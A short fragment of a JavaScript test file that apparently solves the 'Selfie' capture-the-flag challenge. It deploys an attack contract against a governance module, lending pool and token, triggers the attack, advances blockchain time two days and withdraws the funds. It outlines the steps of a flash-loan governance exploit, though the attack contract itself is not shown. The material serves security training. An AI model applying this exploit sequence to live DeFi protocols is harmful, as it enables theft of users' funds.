...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    ...
    const AttackFacatory = await ethers.getContractFactory(
      "SelfieAttack",
      attacker
    );
    this.attackContract = await AttackFacatory.deploy(
      this.governance.address,
      this.pool.address,
      this.token.address
    );
    await this.attackContract.attack();
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); //2days
    await this.attackContract.withdraw();
  });
